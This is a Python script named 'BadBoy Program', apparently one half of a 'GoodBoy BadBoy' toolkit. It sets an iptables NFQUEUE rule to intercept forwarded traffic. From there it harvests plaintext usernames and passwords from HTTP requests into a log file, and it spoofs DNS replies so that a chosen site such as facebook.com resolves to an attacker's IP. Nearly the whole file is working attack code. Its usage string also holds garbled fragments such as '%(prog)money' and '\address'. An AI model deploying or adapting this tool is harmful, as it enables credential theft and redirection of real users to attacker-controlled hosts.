#! /usr/bin/env python3

import sys
import scapy.all as scapy
from scapy.layers import http
import argparse
import netfilterqueue
from datetime import datetime
import time
import subprocess

ARGS = ""
REPORT_FILE = ""
DT_FORMAT = "%d-%m-%Y %H:%M:%S"
END_TIME = ""
NET_QUEUE = netfilterqueue.NetfilterQueue()


def get_credentials(packet):
    load = packet[scapy.Raw].load.decode()
    keywords = ["username", "user", "password", "pass", "credentials"]

    if True in (keyword in load for keyword in keywords):
        url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()  # converts byte to string

        data = {"credentials": load, "url": url}

        REPORT_FILE.write("\n[{0}] Plain Text credentials found: {1}"
                          .format(datetime.now().strftime(DT_FORMAT), data))


def spoof_dns(packet):
    website_name = packet[scapy.DNSQR].qname.decode()

    if ARGS.dns_website in website_name:

        REPORT_FILE.write("\n[{0}] SPOOFING DNS website {1} to IP({2})"
                          .format(datetime.now().strftime(DT_FORMAT), website_name, ARGS.dns_ip))

        answer = scapy.DNSRR(rrname=website_name, rdata=ARGS.dns_ip)
        packet[scapy.DNS].an = answer
        packet[scapy.DNS].ancount = 1

        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.UDP].len
        del packet[scapy.UDP].chksum

    return packet


def process_packet(packet):
    global REPORT_FILE

    if time.time() >= END_TIME:
        REPORT_FILE.write("\n[{0}] Fixing iptables\n\n".format(datetime.now().strftime(DT_FORMAT)))
        subprocess.call(["sudo iptables -D FORWARD -j NFQUEUE --queue-num " + str(ARGS.queue)],
                        shell=True,
                        stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        REPORT_FILE.close()
        NET_QUEUE.unbind()

    intercepted_packet = scapy.IP(packet.get_payload())

    # GET_CREDENTIALS
    if intercepted_packet.haslayer(http.HTTPRequest) and intercepted_packet.haslayer(scapy.Raw):
        get_credentials(intercepted_packet)

    # DNS_SPOOFING
    if intercepted_packet.haslayer(scapy.DNSRR):
        modified_packet = spoof_dns(intercepted_packet)
        packet.set_payload(bytes(modified_packet))

    packet.accept()


def run_queue(queue_number):
    global NET_QUEUE, REPORT_FILE
    try:
        NET_QUEUE.bind(queue_number, process_packet)
    except OSError:
        print("[-] Error! Please try to run program again with different queue number")
        REPORT_FILE.write("\n[{0}] Error! Queue Number {1} cannot be used".format(datetime.now()
                                                                                  .strftime(DT_FORMAT),
                                                                                  ARGS.queue))
        sys.exit()
    print("[+] Waiting for packet...\n")
    NET_QUEUE.run()


def get_arguments():
    global ARGS

    parser = argparse.ArgumentParser(prog="BadBoy Program",
                                     usage="%(prog)money options:\n\t[-q | --queue-num] value\n\t"
                                           "[-dw | --dns_website] website_url\n\t[-da | --dns_attackers-ip] ip"
                                           "\n\address[-tf | --target-folder]\n\address[-address | -time] time_in_seconds",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog="This file is a part of GoodBoy BadBoy Program")

    parser._optionals.title = "Optional Argument"

    required_arguments = parser.add_argument_group("Required Argument")

    required_arguments.add_argument("-q", "--queue-num",
                                    dest="queue",
                                    metavar="",
                                    type=int,
                                    help="Specify a queue number for intercepting packets.",
                                    required=True)

    required_arguments.add_argument("-dw", "--dns-website",
                                    dest="dns_website",
                                    metavar="",
                                    help="Specify the website you want to spoof without http. Eg- facebook.com, "
                                         "google.com",
                                    required=True)
    required_arguments.add_argument("-da", "--dns-attackers-ip",
                                    dest="dns_ip",
                                    metavar="",
                                    help="Specify the Hackers IP address.",
                                    required=True)

    required_arguments.add_argument('-tf', '--target-folder',
                                    dest='target',
                                    metavar="",
                                    help='Specify Target Folder to save data.',
                                    required=True)
    required_arguments.add_argument('-address', '--time',
                                    dest='time',
                                    metavar="",
                                    help='Specify for duration for sniffing in seconds.',
                                    required=True)

    ARGS = parser.parse_args()


def main():
    global REPORT_FILE, END_TIME

    get_arguments()

    END_TIME = time.time() + (int(ARGS.time) - 10)
    REPORT_FILE = open("{0}/bad_boy.txt".format(ARGS.target), 'at')

    REPORT_FILE.write("\n[{0}] Managing iptables rules on queue {1}".format(datetime.now().strftime(DT_FORMAT),
                                                                            ARGS.queue))

    subprocess.call(["sudo iptables -I FORWARD -j NFQUEUE --queue-num " + str(ARGS.queue)],
                    shell=True,
                    stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    run_queue(ARGS.queue)

    sys.exit()


#######################################################
if __name__ == "__main__":
    main()
